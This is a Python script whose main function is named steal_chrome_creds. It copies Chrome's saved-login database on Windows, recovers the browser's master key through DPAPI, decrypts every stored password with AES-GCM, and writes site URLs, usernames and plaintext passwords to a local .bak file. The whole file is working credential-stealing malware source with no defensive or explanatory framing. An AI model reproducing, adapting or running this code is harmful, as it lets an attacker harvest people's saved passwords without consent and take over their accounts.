import os
import re
import json
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES
import shutil


__ORIGINAL_FILE           = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Default\Login Data"%(os.environ['USERPROFILE']))
__COPY_FILE               = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Default\Login Data.bak"%(os.environ['USERPROFILE']))
__CHROME_PATH_LOCAL_STATE = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Local State"%(os.environ['USERPROFILE']))


def __decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)


def __generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)


def __get_secret_key():
    try:
        with open(__CHROME_PATH_LOCAL_STATE, "r", encoding='utf-8') as f: #(1) Get secretkey from chrome local state
            local_state = f.read()
            local_state = json.loads(local_state)
        secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        secret_key = secret_key[5:] #Remove suffix DPAPI
        secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
        return secret_key
    except Exception as e:
        return None


def __decrypt_password(ciphertext, secret_key):
    try:
        initialisation_vector = ciphertext[3:15] # Initialisation vector for AES decryption
        encrypted_password = ciphertext[15:-16] # Get encrypted password by removing suffix bytes (last 16 bits), encrypted password is 192 bits
        cipher = __generate_cipher(secret_key, initialisation_vector) # Build the cipher to decrypt the ciphertext
        decrypted_pass = __decrypt_payload(cipher, encrypted_password)
        decrypted_pass = decrypted_pass.decode()  
        return decrypted_pass
    except Exception as e:
        return ""


def __copy_db_file():
    try:
        shutil.copyfile(__ORIGINAL_FILE, __COPY_FILE) # Copy file to prevent DB locking
    except Exception as e:
        print(e)


def __open_db_connection():
    try:
        con = sqlite3.connect(__COPY_FILE) # Create an SQL connection to our SQLite database
        cur = con.cursor()
        return con, cur
    except Exception as e:
        print(e)
        return None


def __get_chrome_creds(cur):
    secret_key = __get_secret_key() # Get secret key to decrypt chrome passwords
    chrome_creds = []
    for row in cur.execute("SELECT origin_url, username_value, password_value FROM logins"): # Get, decode and output SQLite DB values to other file
        origin_url, username, enc_password = row[0], row[1], row[2]

        if re.match(r"^android\:", origin_url): # remove unrelevent android data
            continue

        decrypted_password = __decrypt_password(enc_password, secret_key)
        chrome_creds.append({"origin_url": origin_url, "username": username, "password": decrypted_password})
    return chrome_creds


def __write_chrome_creds(chrome_creds):
    with open(__COPY_FILE, "w+") as f: # send chrome data to bak file
        for record in chrome_creds:
            try:
                f.write(f"{record['origin_url']}, {record['username']}, {record['password']}\n")
            except Exception as e:
                continue


def steal_chrome_creds():
    __copy_db_file() # get chrome credentials
    con, cur = __open_db_connection()
    chrome_creds = __get_chrome_creds(cur)
    con.close() # Close SQLite3 connection
    __write_chrome_creds(chrome_creds)